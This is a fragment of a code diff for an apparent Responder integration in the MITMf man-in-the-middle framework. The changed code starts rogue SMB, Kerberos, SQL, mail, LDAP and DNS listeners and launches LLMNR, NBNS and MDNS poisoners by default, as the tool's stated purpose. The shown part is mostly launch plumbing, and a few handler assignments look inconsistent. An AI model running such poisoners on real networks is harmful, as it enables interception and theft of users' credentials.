+			t2 = threading.Thread(name="SMB1LM-139", target=self.serve_thread_tcp, args=("0.0.0.0", 139, SMB1LM))
+			for t in [t1, t2]:
+				t.setDaemon(True)
+				t.start()
+
+			return t1, t2
+
+		else:
+			t1 = threading.Thread(name="SMB1-445", target=serve_thread_tcp, args=("0.0.0.0", 445, SMB1))
+			t2 = threading.Thread(name="SMB1-139", target=serve_thread_tcp, args=("0.0.0.0", 139, SMB1))
+
+			for t in [t1,t2]:
+				t.setDaemon(True)
+				t.start()
+
+			return t1, t2
+
+	if SMB_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_Kerberos_On(Krb_On_Off):
+	if Krb_On_Off == "ON":
+		t1 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=("0.0.0.0", 88,KerbUDP))
+		t2 = threading.Thread(name="KerbTCP", target=serve_thread_tcp, args=("0.0.0.0", 88, KerbTCP))
+		for t in [t1,t2]:
+			t.setDaemon(True)
+			t.start()
+
+		return t1, t2
+	if Krb_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_SQL_On(SQL_On_Off):
+	if SQL_On_Off == "ON":
+		t = threading.Thread(name="MSSQL", target=serve_thread_tcp, args=("0.0.0.0", 1433,MSSQL))
+		t.setDaemon(True)
+		t.start()
+		return t
+	if SQL_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_FTP_On(FTP_On_Off):
+	if FTP_On_Off == "ON":
+		t = threading.Thread(name="FTP", target=serve_thread_tcp, args=("0.0.0.0", 21,FTP))
+		t.setDaemon(True)
+		t.start()
+		return t
+
+	if FTP_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_POP_On(POP_On_Off):
+	if POP_On_Off == "ON":
+		t = threading.Thread(name="POP", target=serve_thread_tcp, args=("0.0.0.0", 110,POP))
+		t.setDaemon(True)
+		t.start()
+		return t
+	if POP_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_LDAP_On(LDAP_On_Off):
+	if LDAP_On_Off == "ON":
+		t = threading.Thread(name="LDAP", target=serve_thread_tcp, args=("0.0.0.0", 389,LDAP))
+		t.setDaemon(True)
+		t.start()
+		return t
+	if LDAP_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_SMTP_On(SMTP_On_Off):
+	if SMTP_On_Off == "ON":
+		t1 = threading.Thread(name="ESMTP-25", target=serve_thread_tcp, args=("0.0.0.0", 25,ESMTP))
+		t2 = threading.Thread(name="ESMTP-587", target=serve_thread_tcp, args=("0.0.0.0", 587,ESMTP))
+		
+		for t in [t1, t2]:
+			t.setDaemon(True)
+			t.start()
+
+		return t1,t2
+
+	if SMTP_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_IMAP_On(IMAP_On_Off):
+	if IMAP_On_Off == "ON":
+		t = threading.Thread(name="IMAP", target=serve_thread_tcp, args=("0.0.0.0", 143,IMAP))
+		t.setDaemon(True)
+		t.start()
+		return t
+	if IMAP_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_DNS_On(DNS_On_Off):
+	if DNS_On_Off == "ON":
+		t1 = threading.Thread(name="DNS", target=serve_thread_udp, args=("0.0.0.0", 53,DNS))
+		t2 = threading.Thread(name="DNSTCP", target=serve_thread_udp, args=("0.0.0.0", 53,DNSTCP))
+		for t in [t1, t2]:
+			t.setDaemon(True)
+			t.start()
+
+		return t1,t2
+	if DNS_On_Off == "OFF":
+		return False
+
+##################################################################################
+#Server loading ends here
+##################################################################################
+
 class ResponderMITMf():
+
+	''' Main class thats kicks off Responder'''
 
 	def setCoreVars(self, options, config):
 
@@ -2546,12 +2458,8 @@ class ResponderMITMf():
 
 	def AnalyzeICMPRedirect(self):
 		result = False
-
-		if Analyze(AnalyzeMode) and OURIP is not None and INTERFACE == 'Not set':
+		if AnalyzeMode:
 			result = self.IsICMPRedirectPlausible(OURIP)
-		
-		if Analyze(AnalyzeMode) and INTERFACE != 'Not set':
-			result = self.IsICMPRedirectPlausible(FindLocalIP(INTERFACE))
 
 		return result
 
@@ -2597,6 +2505,7 @@ class ResponderMITMf():
 		print start_message
 
 	def start(self):
+
 		Is_FTP_On(FTP_On_Off)
 		Is_HTTP_On(On_Off)
 		Is_HTTPS_On(SSL_On_Off)
@@ -2610,12 +2519,12 @@ class ResponderMITMf():
 		Is_SMTP_On(SMTP_On_Off)
 		Is_IMAP_On(IMAP_On_Off)
 		#Browser listener loaded by default
-		t1 = threading.Thread(name="Browser", target=serve_thread_udp, args=('', 138, Browser))
+		t1 = threading.Thread(name="Browser", target=serve_thread_udp, args=("0.0.0.0", 138, Browser))
 		## Poisoner loaded by default, it's the purpose of this tool...
-		t2 = threading.Thread(name="MDNS", target=serve_thread_udp_MDNS, args=('', 5353, MDNS)) #MDNS
-		t3 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=('', 88, KerbUDP)) 
-		t4 = threading.Thread(name="NBNS", target=serve_thread_udp, args=('', 137,NB)) #NBNS
-		t5 = threading.Thread(name="LLMNR", target=serve_thread_udp_LLMNR, args=('', 5355, LLMNR)) #LLMNR
+		t2 = threading.Thread(name="MDNS", target=serve_thread_udp_MDNS, args=("0.0.0.0", 5353, MDNS)) #MDNS
+		t3 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=("0.0.0.0", 88, KerbUDP)) 
+		t4 = threading.Thread(name="NBNS", target=serve_thread_udp, args=("0.0.0.0", 137,NB)) #NBNS
+		t5 = threading.Thread(name="LLMNR", target=serve_thread_udp_LLMNR, args=("0.0.0.0", 5355, LLMNR)) #LLMNR
 
 		for t in [t1, t2, t3, t4, t5]:
 			t.setDaemon(True)
